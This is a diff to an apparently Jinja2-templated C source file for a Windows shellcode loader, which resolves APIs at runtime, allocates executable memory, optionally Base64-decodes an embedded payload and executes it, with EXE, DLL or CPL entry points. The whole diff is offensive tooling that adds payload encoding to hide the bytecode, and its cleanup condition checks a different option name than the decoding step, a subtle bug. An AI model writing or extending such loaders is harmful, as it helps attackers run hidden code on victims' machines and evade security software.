@@ -4,7 +4,7 @@
 #include <debugapi.h>
 {% endif %}
 
-// Use DEBUG_PRINT macro if debug mode is selected
+// We're using DEBUG_PRINT macro if debug mode is selected
 {% if debug_mode %}
 char debug_buffer[512];
 #define DEBUG_PRINT(fmt, ...) \
@@ -16,29 +16,53 @@ char debug_buffer[512];
 #define DEBUG_PRINT(fmt, ...) // The macro becomes nothing if debug is off
 {% endif %}
 
-// --- Bytecode Placeholder ---
-unsigned char bytecode[] = { {{ bytecode_array }} };
-unsigned int bytecode_len = sizeof(bytecode);
+// --- Transformed Bytecode Placeholder ---
+unsigned char transformed_bytecode[] = { {{ bytecode_array }} };
+unsigned int transformed_bytecode_len = sizeof(transformed_bytecode);
 
 // --- DYNAMICALLY INCLUDE PARTIALS ---
 {% include 'partials/api_resolver.c.j2' %}
 {% include allocation_partial %}
 {% include execution_partial %}
+{% if bytecode_transformation == 'base64_encoder' %}
+    {% include 'partials/decode_base64.c.j2' %}
+{% endif %}
 
 // --- Function Forward Declarations ---
 void* AllocateExecutableMemory(SIZE_T size);
-void ExecutePayload(void* exec_mem);
+void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len);
 void ResolveAPIs();
 
 // --- Main Logic ---
 void Run() {
+    unsigned char* raw_bytecode = NULL;
+    size_t raw_bytecode_len = 0;
     void* memory_block;
     
     ResolveAPIs();
-    
-    memory_block = AllocateExecutableMemory(bytecode_len);
-    
-    ExecutePayload(memory_block);
+
+    {% if bytecode_transformation == 'base64_encoder' %}
+        DEBUG_PRINT("Run: Decoding Base64 data...");
+        raw_bytecode = Base64Decode(transformed_bytecode, transformed_bytecode_len, &raw_bytecode_len);
+        if (raw_bytecode == NULL) {
+            DEBUG_PRINT("Run: Base64 decoding failed!");
+            return;
+        }
+        DEBUG_PRINT("Run: Successfully decoded %zu bytes.", raw_bytecode_len);
+    {% else %}
+        raw_bytecode = transformed_bytecode;
+        raw_bytecode_len = transformed_bytecode_len;
+    {% endif %}
+
+    memory_block = AllocateExecutableMemory(raw_bytecode_len);
+    ExecutePayload(memory_block, raw_bytecode, raw_bytecode_len);
+
+    {% if bytecode_transformation == 'base64' %}
+        if (raw_bytecode != NULL) {
+            free(raw_bytecode);
+            DEBUG_PRINT("Run: Freed memory from Base64 decoding.");
+        }
+    {% endif %}
 }
 
 // --- Entry Point (EXE, DLL or CPL) ---
